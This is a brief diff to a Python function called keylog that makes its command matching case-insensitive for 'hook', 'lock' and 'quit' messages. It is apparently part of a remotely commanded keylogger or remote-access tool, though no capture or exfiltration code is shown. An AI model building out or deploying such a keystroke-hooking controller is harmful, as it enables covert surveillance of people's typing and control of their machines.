@@ -81,16 +81,17 @@ def keylog(msg):
     flag = 0
     cont = " "
     msgRep = " "
-    if "HOOK" in msg:
+    msg = msg.lower()
+    if "hook" in msg:
         if ishook == 0:
             flag = 1
             ishook = 1
         else:
             flag = 2
             ishook = 0
-    elif "LOCK" in msg:
+    elif "lock" in msg:
         msgRep = lock()
-    elif "QUIT" in msg:
+    elif "quit" in msg:
         flag = 4
         return
     return msgRep
